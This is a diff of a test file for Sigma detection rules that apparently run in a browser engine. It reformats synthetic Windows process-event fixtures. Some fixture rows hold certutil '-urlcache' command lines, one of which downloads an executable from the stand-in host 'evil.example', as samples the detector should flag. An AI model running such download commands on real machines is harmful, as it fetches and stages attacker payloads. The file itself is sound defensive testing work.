@@ -15,9 +15,27 @@ describe('Sigma-converted rules on the browser engine', () => {
     if (!v.ok) return
     const sysmon = 'Microsoft-Windows-Sysmon/Operational'
     const rows = [
-      { id: 1, ts: 1, eventId: 1, channel: sysmon, image: 'C:\\Windows\\System32\\certutil.exe', commandLine: 'certutil -urlcache -split -f http://evil.example/a.exe a.exe', parentImage: 'C:\\Windows\\System32\\cmd.exe', data: {} },
+      {
+        id: 1,
+        ts: 1,
+        eventId: 1,
+        channel: sysmon,
+        image: 'C:\\Windows\\System32\\certutil.exe',
+        commandLine: 'certutil -urlcache -split -f http://evil.example/a.exe a.exe',
+        parentImage: 'C:\\Windows\\System32\\cmd.exe',
+        data: {},
+      },
       { id: 2, ts: 2, eventId: 1, channel: sysmon, image: 'C:\\Windows\\System32\\certutil.exe', commandLine: 'certutil -urlcache -f http://x/y', parentImage: 'C:\\Windows\\explorer.exe', data: {} },
-      { id: 3, ts: 3, eventId: 4688, channel: 'Security', processName: 'C:\\Windows\\System32\\certutil.exe', commandLine: 'CERTUTIL -URLCACHE http://x', parentProcessName: 'C:\\Windows\\System32\\cmd.exe', data: {} },
+      {
+        id: 3,
+        ts: 3,
+        eventId: 4688,
+        channel: 'Security',
+        processName: 'C:\\Windows\\System32\\certutil.exe',
+        commandLine: 'CERTUTIL -URLCACHE http://x',
+        parentProcessName: 'C:\\Windows\\System32\\cmd.exe',
+        data: {},
+      },
       { id: 4, ts: 4, eventId: 1, channel: sysmon, image: 'C:\\Windows\\notepad.exe', commandLine: 'notepad -urlcache http', parentImage: 'C:\\a.exe', data: {} },
       { id: 5, ts: 5, eventId: 7, channel: sysmon, image: 'C:\\Windows\\System32\\certutil.exe', commandLine: 'certutil -urlcache http', data: {} },
     ]
